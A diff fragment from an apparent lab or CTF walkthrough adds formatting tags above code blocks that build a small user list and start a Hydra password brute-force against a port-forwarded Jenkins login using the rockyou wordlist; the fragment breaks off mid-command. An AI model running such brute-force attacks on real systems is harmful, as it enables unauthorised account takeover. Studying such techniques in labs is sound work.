@@ -20,12 +20,14 @@ When Jenkins is only reachable through a local port forward and no lockout is pr
 
 Create a small user list:
 
+<!-- cmd: linux -->
 ```bash
 echo -e "admin\naubreanna" > users.txt
 ```
 
 Run Hydra:
 
+<!-- cmd: linux -->
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
   127.0.0.1 -s 8080 http-form-post \
